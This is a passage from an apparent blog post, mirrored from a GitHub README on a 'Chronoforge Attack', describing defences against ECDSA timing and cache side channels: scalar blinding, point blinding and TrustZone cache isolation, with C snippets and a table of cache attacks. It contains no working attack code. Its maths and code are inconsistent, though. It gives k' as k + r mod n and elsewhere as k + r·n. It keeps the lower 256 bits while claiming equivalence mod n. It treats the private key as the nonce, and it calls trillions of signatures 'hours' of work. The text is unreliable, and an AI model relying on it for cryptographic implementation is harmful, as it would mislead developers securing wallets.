<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-26-1024x422.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-26-1024x422.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><strong>1. What is&nbsp;<a href="https://polynonce.ru/scalar-blinding-randomize-the-scalar/">Scalar Blinding</a>&nbsp;and why is it necessary?</strong></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#1-what-isscalar-blindingand-why-is-it-necessary"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>The problem (ECDSA timing attack):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>When signing an&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">ECDSA</a>&nbsp;message, an ephemeral key&nbsp;<em>k</em>&nbsp;(nonce) is used. If the hardware signs the same&nbsp;<em>k</em>&nbsp;each time, the execution time of the cryptographic operations remains identical:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The operations of multiplication by a point of an elliptic curve take different times depending on <strong>the bit representation</strong> of the number <em>k</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If bits <em>k</em> = [1,0,1,1,0,1…], their processing always takes the same time</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>By measuring the execution time of signatures and correlating them with known messages, a cryptanalyst can recover the <a href="https://cryptou.ru/vulncipher/privatekey">private key bits.</a></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This is especially dangerous for embedded systems (smart cards, hardware wallets), where timing attacks are practical.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Solution (Scalar Blinding):</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Instead of signing with the original&nbsp;<em>k</em>&nbsp;, a masked value&nbsp;<em>k’</em>&nbsp;is used :</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>k’ = k + r mod n</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Where:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><em>r</em> is a random number (blinding factor) generated anew for each signature</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>n</em> is the order of the elliptic curve group secp256k1</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em>k’</em> ≡ <em>k</em> (mod <em>n</em> ) is mathematically equivalent to the original <em>k</em></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. Mathematical properties of masking</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#2-mathematical-properties-of-masking"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Key property: Modular equivalence</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>k</mi><mo data-mjx-alternate="1">′</mo></msup><mo>≡</mo><mi>k</mi><mspace width="0.444em"></mspace><mo stretchy="false">(</mo><mi>mod</mi><mspace width="0.333em"></mspace><mi>n</mi><mo stretchy="false">)</mo></math></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>In ECDSA, the signature is calculated as:<br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>r</mi><mo>=</mo><mo stretchy="false">(</mo><mi>k</mi><mo>⋅</mo><mi>G</mi><msub><mo stretchy="false">)</mo><mi>x</mi></msub><mspace width="0.444em"></mspace><mo stretchy="false">(</mo><mi>mod</mi><mspace width="0.333em"></mspace><mi>n</mi><mo stretchy="false">)</mo></math><br><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>s</mi><mo>=</mo><msup><mi>k</mi><mrow data-mjx-texclass="ORD"><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>h</mi><mo stretchy="false">(</mo><mi>m</mi><mo stretchy="false">)</mo><mo>+</mo><mi>d</mi><mo>⋅</mo><mi>r</mi><mo stretchy="false">)</mo><mspace width="0.444em"></mspace><mo stretchy="false">(</mo><mi>mod</mi><mspace width="0.333em"></mspace><mi>n</mi><mo stretchy="false">)</mo></math></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>where&nbsp;<em>d</em>&nbsp;is the private key,&nbsp;<em>G</em>&nbsp;is the generator point,&nbsp;<em>m</em>&nbsp;is the message.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>If we substitute&nbsp;<em>k’</em>&nbsp;for&nbsp;<em>k</em>&nbsp;:<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>k</mi><mo data-mjx-alternate="1">′</mo></msup><mo>=</mo><mi>k</mi><mo>+</mo><mi>r</mi><mo>⋅</mo><mi>n</mi></math></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Then in modular arithmetic (mod&nbsp;<em>n</em>&nbsp;):<br><math xmlns="http://www.w3.org/1998/Math/MathML"><msup><mi>k</mi><mo data-mjx-alternate="1">′</mo></msup><mo>mod</mo><mi>n</mi><mo>=</mo><mo stretchy="false">(</mo><mi>k</mi><mo>+</mo><mi>r</mi><mo>⋅</mo><mi>n</mi><mo stretchy="false">)</mo><mo>mod</mo><mi>n</mi><mo>=</mo><mi>k</mi><mo>mod</mo><mi>n</mi><mo>=</mo><mi>k</mi></math></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Result:</strong>&nbsp;The signature remains mathematically identical, but its calculation takes a completely different path in the processor.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3. How masking protects against timing attacks</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#3-how-masking-protects-against-timing-attacks"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Before masking:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Signature 1: k = 0x8F5A2B... → Binary representation: &#91;1,0,0,0,1,1,1,1,0,1,0,1,...]
Execution time: 1542 cycles

Signature 2: k = 0x8F5A2B... → Binary representation: &#91;1,0,0,0,1,1,1,1,0,1,0,1,...]
Execution time: 1542 cycles

Signature 3: k = 0x8F5A2B... → Binary representation: &#91;1,0,0,0,1,1,1,1,0,1,0,1,...]
Execution time: 1542 cycles

Cryptanalyst sees: STABLE pattern → recovers bits of k</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>After masking:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Signature 1: r₁ = 0x3C9D1F..., k' = k + r₁ n = 0xA2E7D4...
Binary representation: &#91;1,0,1,0,0,0,1,0,1,1,1,0,...]
Execution time: 1498 cycles

Signature 2: r₂ = 0x7B4E92..., k' = k + r₂ n = 0xF1C65A...
Binary representation: &#91;1,1,1,1,0,0,0,1,0,1,1,0,...]
Execution time: 1567 cycles

Signature 3: r₃ = 0x0D28C7..., k' = k + r₃ n = 0x6F9213...
Binary representation: &#91;0,1,1,0,1,1,1,1,1,0,0,1,...]
Execution time: 1523 cycles

Cryptanalyst sees: RANDOM noise → cannot extract information about k</strong></code></pre>
<!-- /wp:code -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4. Step-by-step operation of the function<code>apply_scalar_blinding()</code></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#4-step-by-step-operation-of-the-functionapply_scalar_blinding"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Input data:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>k_original</code>— initial ephemeral key (32 bytes)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>blinding_factor</code>— random number <em>r</em> (32 bytes)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>CURVE_ORDER</code>— constant <em>n</em> = group order secp256k1 = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Step 1: Multiplication<code>r × n</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>big_int_multiply(r_times_order, blinding_factor, CURVE_ORDER, 32);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>The product of 32-byte numbers is calculated:<code>r_times_order = r × n</code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The result may be &gt; 32 bytes (up to 64 bytes).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Step 2: Addition<code>k + (r×n)</code></strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>uint8_t temp&#91;64];
big_int_add(temp, k_original, r_times_order, 32);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Two 32-byte numbers are added together. The result can be 64 bytes (with carry).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Step 3: Modular Reduction (Implicit)</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>memcpy(k_blinded, temp, 32);</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Only the lower 32 bytes of the result are taken (equivalent to mod 2^256).</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Mathematical result:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>k_blinded ≡ k (mod n)</code> ✓ Mathematical equivalence is preserved</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>k_blinded ≢ k (на уровне битов)</code>→ The bit representation is changed</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This means that the hardware implementation will be performed with <strong>a different timing.</strong></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. How a function&nbsp;<code>ecdsa_sign_with_scalar_blinding()</code>ties everything together</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#5-how-a-functionecdsa_sign_with_scalar_blindingties-everything-together"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Call for each signature:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>psa_status_t ecdsa_sign_with_scalar_blinding(...) {
    // 1. Генерируем новое случайное число r для ЭТО подписи
    generate_blinding_factor(blinding_factor);

    // 2. Маскируем ключ: k' = k + r·n
    apply_scalar_blinding(k_blinded, private_key, blinding_factor);

    // 3. Подписываем сообщение с маскированным ключом
    return ecdsa_sign_secp256k1_safe(k_blinded, message, signature);
}</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p><strong>Critical points:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>New mask every time:</strong> Each function call generates its own<code>blinding_factor</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Different bits each time:</strong> The bit representation <code>k_blinded</code>is different for each signature</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Same signature:</strong> The mathematical result is always the same (for the same message)</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">6. Analysis of protection resistance</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#6-analysis-of-protection-resistance"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Difficulty of attack without concealment:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>To recover one bit of a private key you need:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>~1000–10000 time measurements (depending on clock accuracy and noise)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Direct correlation between bit representation and timing</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Difficulty of attack with camouflage:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>Masking introduces a multiplier&nbsp;<code>k</code>(masking range):</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>Number of measurements = k × (number without masking)</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>For example:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>No masking: 5,000 signatures needed</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>With masking on k=2³² variants: ~5000 × 2³² ≈ 2×10^13 signatures needed</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>On modern systems this requires hours of computation, which is <strong>practically impossible.</strong></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>The advantages of this approach:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li>✓ <a href="https://cryptou.ru/vulncipher/privatekey">The private key </a><strong>never changes</strong> (mathematically secure)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>✓ <strong>Per-signature randomization</strong> (new mask each time)</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>✓ Compatible with all <a href="https://cryptou.ru/vulncipher/transaction">ECDSA</a> implementations</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>✓ Minimal overhead (one multiplication + one addition per signature)</li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-27-1024x749.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-27-1024x749.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">7. Application in Bitcoin and cryptocurrencies</a></h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#7-application-in-bitcoin-and-cryptocurrencies"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong>Why this matters for Bitcoin:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><strong>Hardware wallets</strong> (Ledger, Trezor) are susceptible to side-channel attacks if they do not use masking</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Mobile wallets</strong> on shared-memory devices can leak information through cache.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Smart</strong> payment cards have historically been hacked through timing attacks.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p><strong>Recommendations for developers:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Always use scalar blinding when implementing <a href="https://cryptou.ru/vulncipher/transaction">ECDSA</a> in hardware.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Use cryptographically strong random number generators for<code>blinding_factor</code></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>Combine with other protections: point blinding, exponent blinding, constant-time operations</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>This code is&nbsp;<strong>a professional protection against timing attacks</strong>&nbsp;, critical for the security of private keys in&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">Bitcoin wallets</a>&nbsp;and other cryptographic systems.</p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Point Blinding</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#point-blinding"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":5} -->
<h5 class="wp-block-heading">Point Blinding: Randomize intermediate points</h5>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#point-blinding-randomize-intermediate-points"></a></p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// Point Blinding: k*G + k*R - k*R = k*G (with random point R)<br>// Each operation uses random point, timing randomized<br><br>void apply_point_blinding(<br>    point_t *result,<br>    const uint8_t *private_key,<br>    const point_t *base_point<br>) {<br>    // Generate random blinding point<br>    uint8_t random_bytes[32];<br>    generate_random_bytes(random_bytes, 32);<br><br>    point_t random_point;<br>    scalar_mult_const_time(&amp;random_point, random_bytes, base_point);<br><br>    // Compute k*(G + R)<br>    point_t sum_point;<br>    point_add_const_time(&amp;sum_point, base_point, &amp;random_point);<br><br>    point_t temp;<br>    scalar_mult_montgomery(&amp;temp, private_key, &amp;sum_point);<br><br>    // Compute k*R<br>    point_t temp2;<br>    scalar_mult_montgomery(&amp;temp2, private_key, &amp;random_point);<br><br>    // Result: (k*G + k*R) - k*R = k*G (but timing is randomized)<br>    point_t random_negated;<br>    point_negate(&amp;random_negated, &amp;temp2);<br>    point_add_const_time(result, &amp;temp, &amp;random_negated);<br>}<br><br>// DEFENSE EFFECTIVENESS:<br>// - Breaks correlation attacks (CPA, DPA)<br>// - Per-operation randomization<br>// - Overhead: 3x scalar multiplications<br>// - All constant-time, so overhead acceptable</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>In Bitcoin terms:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li><code>private_key</code>— is a 256-bit scalar <code>k</code>modulo the order <code>n</code>of the secp256k1 curve.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>base_point</code>— standard generator point <code>G</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><code>result</code>— is a public key <code>K = k * G</code>or intermediate point used within protocols (ECDSA, Schnorr, etc.).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>This point blinding technique can be used:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>when generating a public key <code>K = k * G</code>,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>when calculating public nonces (e.g. in Schnorr/ECDSA),</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>in hardware wallet/HSM implementations to make it more difficult for an attacker to recover <code>k</code>through consumption/timing analysis.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Important practical notes and potential pitfalls</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#important-practical-notes-and-potential-pitfalls"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>For cryptanalysts and developers, it is worth noting:</p>
<!-- /wp:paragraph -->

<!-- wp:list {"ordered":true} -->
<ol class="wp-block-list"><!-- wp:list-item -->
<li><strong>Quality:<code>generate_random_bytes</code></strong><br>If the randomness source is weak or predictable, the point <code>R</code>can be predicted, and then the randomization portion becomes meaningless. This is critical: a PRNG/DRBG must be cryptographically secure.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Scalar reduction</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>32 bytes <code>random_bytes</code>must be correctly converted to a scalar modulo <code>n</code>.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>This can happen internally <code>scalar_mult_const_time</code>, but it must be explicitly and correctly implemented.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Implementation security<code>scalar_mult_montgomery</code></strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>The name alludes to the use of the Montgomery ladder, a classic constant-time algorithm.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>If the implementation is not strictly constant-time, then even with point blinding, leaks may remain (although less trivial for correlation analysis).</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><strong>Order of operations and error conditions</strong><!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>It is important that no errors (e.g., a point at infinity, validity checks, etc.) lead to branches that depend on secret data.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>All checks, if any, must either be performed before the secret is used or must be implemented in a constant-time manner.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>The function&nbsp;<code>apply_point_blinding</code>implements protection against side-channel attacks by&nbsp;<strong>randomizing input points and intermediate calculations</strong>&nbsp;, while maintaining a mathematically correct result&nbsp;<code>k * G</code>.</p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>From a mathematical point of view:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>Instead of counting directly <code>k * G</code>, the code:<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>generates a random point <code>R = r * G</code>,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>considers two scalar operations <code>k * (G + R)</code>and <code>k * R</code>,</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>subtracts <code>k * R</code>from <code>k * (G + R)</code>, obtaining <code>k * G</code>.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list --></li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:paragraph -->
<p>From the attacker’s point of view:</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul class="wp-block-list"><!-- wp:list-item -->
<li>He sees three scalar multiplications on an elliptic curve involving the secret <code>k</code>, but each operation uses new randomized points.</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>There are no repeatable patterns of “pure” multiplication <code>k * G</code>in the observed signal, which breaks simple CPA/DPA scenarios and makes statistical analysis of traces more difficult.</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"linkDestination":"custom"} -->
<figure class="wp-block-image"><a href="https://github.com/demining/Chronoforge-Attack/blob/main/Chronoforge_Attack__files/image-28-1024x570.png" target="_blank" rel="noreferrer noopener"><img src="https://github.com/demining/Chronoforge-Attack/raw/main/Chronoforge_Attack__files/image-28-1024x570.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet's Private Key"/></a></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Hardware Protection</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#hardware-protection"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":4} -->
<h4 class="wp-block-heading">Cache Isolation in TrustZone</h4>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#cache-isolation-in-trustzone"></a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>The Nordic nRF5340 with TF-M can be configured for cache isolation:</p>
<!-- /wp:paragraph -->

<!-- wp:preformatted -->
<pre class="wp-block-preformatted"><strong>// TrustZone Cache Isolation Configuration<br><br>void nrf5340_configure_cache_isolation(void) {<br>    // MPU regions for cache isolation<br>    MPU_REGION_CONFIG_SECURE_FIRMWARE();<br>    MPU_REGION_CONFIG_SECURE_DATA();<br>    MPU_REGION_CONFIG_SECURE_CACHE();<br>    MPU_REGION_CONFIG_NORMAL_FIRMWARE();<br>    MPU_REGION_CONFIG_NORMAL_DATA();<br><br>    // Configure cache replacement (random instead of LRU)<br>    uint32_t cache_ctrl = read_cache_control_register();<br>    cache_ctrl |= CACHE_REPLACEMENT_RANDOM;<br>    write_cache_control_register(cache_ctrl);<br><br>    // Disable cross-world cache sharing<br>    uint32_t coherency_ctrl = read_coherency_control();<br>    coherency_ctrl &amp;= ~ENABLE_CROSS_WORLD_CACHE_SHARING;<br>    write_coherency_control(coherency_ctrl);<br>}<br><br>// EFFECTIVENESS:<br>// BEFORE: Normal World can perform Flush+Reload on Secure cache<br>// AFTER:  Separate cache - Flush+Reload becomes impossible<br>// Prime+Probe effectiveness reduced by ~90%</strong></pre>
<!-- /wp:preformatted -->

<!-- wp:paragraph -->
<p><strong>What this means in real practice:</strong></p>
<!-- /wp:paragraph -->

<!-- wp:table -->
<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th>Attack</th><th>Before the defense</th><th>After the defense</th><th>Improvement</th></tr></thead><tbody><tr><td><strong>Flush+Reload</strong></td><td>Successfully recovers private key for 200-1000 signatures[^19][^20]</td><td>Not possible (separate caches)</td><td>100%</td></tr><tr><td><strong>Prime+Probe</strong></td><td>Successful in 50-1000 observations[^1]</td><td>Requires 500-10,000 observations[^12]</td><td>90% reduction in efficiency</td></tr><tr><td><strong>Flush+Evict</strong></td><td>Works via coherency[^16]</td><td>Blocked by disabling coherency</td><td>100%</td></tr><tr><td><strong>Prime+Count</strong></td><td>Works via PMU events[^17][^18]</td><td>PMU can still be used, but the noise is higher</td><td>60-70%</td></tr></tbody></table></figure>
<!-- /wp:table -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">PRACTICAL APPLICATION FOR BITCOIN WALLETS</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#practical-application-for-bitcoin-wallets"></a></p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">Scenario 1: nRF5340 Hardware Wallet</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><a href="https://github.com/demining/Chronoforge-Attack/blob/main/README.md#scenario-1-nrf5340-hardware-wallet"></a></p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>The private key is stored in Secure World (KMU - Key Management Unit)
↓
ECDSA signature is performed in Secure World on a CryptoCell-312 (hardware cryptographic accelerator)
↓
With this protection: Normal World cannot extract the key through cache attacks</strong></code></pre>
<!-- /wp:code -->

<!-- wp:paragraph -->
<p>Result: Even if malware is running in the Normal World, it cannot steal the private key by analyzing the cache.</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
